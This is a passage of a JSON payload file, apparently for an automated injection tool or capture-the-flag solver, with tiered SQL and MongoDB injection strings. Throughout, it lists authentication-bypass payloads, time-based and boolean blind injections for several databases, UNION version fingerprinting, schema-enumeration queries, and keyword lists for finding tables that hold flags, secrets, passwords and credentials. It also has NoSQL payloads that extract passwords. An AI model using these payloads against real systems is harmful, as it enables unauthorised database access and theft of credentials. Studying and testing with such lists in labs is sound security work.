{
  "sqli": {
    "_comment": "Tiered: detect → confirm → exploit. Script tries detect first; escalates only on hit.",

    "detect": [
      "'",
      "\"",
      "`",
      "\\",
      "1'"
    ],

    "confirm": [
      "' --",
      "' #",
      "' /*",
      "\" --",
      "\" #",
      "1 AND 1=1",
      "1 AND 1=2",
      "' OR '1'='1",
      "' OR 1=1--",
      "\" OR 1=1--",
      "admin'--",
      "' AND '1'='1",
      "' AND '1'='2",
      "x' OR 'x'='x",
      "' OR ''='",
      "1; --",
      "'; --"
    ],

    "blind_time_mysql": [
      "' AND SLEEP(3)--",
      "\" AND SLEEP(3)--",
      "1 AND SLEEP(3)--",
      "' OR SLEEP(3)--",
      "1' AND SLEEP(3) AND '1'='1",
      "'; SELECT SLEEP(3)--",
      "1 AND (SELECT * FROM (SELECT SLEEP(3))a)--",
      "' AND (SELECT 1 FROM (SELECT SLEEP(3))x)--"
    ],

    "blind_time_mssql": [
      "'; WAITFOR DELAY '0:0:3'--",
      "1; WAITFOR DELAY '0:0:3'--",
      "' WAITFOR DELAY '0:0:3'--",
      "'; IF (1=1) WAITFOR DELAY '0:0:3'--"
    ],

    "blind_time_postgres": [
      "'; SELECT pg_sleep(3)--",
      "' OR 1=1; SELECT pg_sleep(3)--",
      "1; SELECT pg_sleep(3)--"
    ],

    "blind_bool": [
      "' AND 1=1--",
      "' AND 1=2--",
      "' AND 'a'='a",
      "' AND 'a'='b",
      "1 AND 1=1--",
      "1 AND 1=2--",
      "' AND substring(username,1,1)='a'--",
      "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--"
    ],

    "union_col_probe": "' UNION SELECT %s-- -",

    "fingerprint": {
      "mysql":    "' UNION SELECT @@version,NULL-- -",
      "mssql":    "' UNION SELECT @@version,NULL-- -",
      "postgres": "' UNION SELECT version(),NULL-- -",
      "sqlite":   "' UNION SELECT sqlite_version(),NULL-- -",
      "database": "' UNION SELECT database(),NULL-- -",
      "db_user":  "' UNION SELECT user(),NULL-- -"
    },

    "table_enum": {
      "mysql_mariadb": "GROUP_CONCAT(table_name SEPARATOR ',') FROM information_schema.tables WHERE table_schema=database()",
      "mssql":         "STRING_AGG(table_name,',') FROM information_schema.tables",
      "sqlite":        "GROUP_CONCAT(name) FROM sqlite_master WHERE type='table'",
      "postgres":      "string_agg(table_name,',') FROM information_schema.tables WHERE table_schema='public'"
    },

    "col_enum": {
      "mysql_mariadb": "GROUP_CONCAT(column_name SEPARATOR ',') FROM information_schema.columns WHERE table_name='%s'",
      "mssql":         "STRING_AGG(column_name,',') FROM information_schema.columns WHERE table_name='%s'",
      "sqlite":        "GROUP_CONCAT(name) FROM pragma_table_info('%s')",
      "postgres":      "string_agg(column_name,',') FROM information_schema.columns WHERE table_name='%s'"
    },

    "flag_table_keywords": ["flag", "secret", "token", "key", "password", "cred", "admin", "private", "hidden", "sensitive", "config", "setting", "auth"],
    "flag_col_keywords":   ["flag", "value", "secret", "data", "content", "text", "answer", "result", "hash", "pass", "token", "key", "code"]
  },

  "nosql": {
    "_comment": "MongoDB / NoSQL injection. Try detect tier first.",

    "detect": [
      "' || '1'=='1",
      "'; return true; var a='",
      "'; return 1==1; var x='",
      "{\"$gt\": \"\"}",
      "{\"$ne\": null}",
      "{\"$where\": \"1==1\"}",
      "{\"$regex\": \".*\"}",
      "true, $where: '1 == 1'",
      ", $where: '1 == 1'",
      "$where: '1 == 1'",
      "{ $gt: '' }",
      "[$ne]=1"
    ],

    "confirm": [
      "' || 1==1//",
      "' || 1==1%00",
      "'; return true//",
      "{\"$gt\": \"\", \"$lt\": \"z\"}",
      "{\"$in\": [\"admin\",\"root\",\"user\"]}",
      "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}"
    ],

    "extract": [
      "' || this.password.match(/.*/)//",
      "' || this.username == 'admin'//",
      "{\"$where\": \"this.password.length > 0\"}",
      "{\"$where\": \"this.role == 'admin'\"}"
    ]
  },

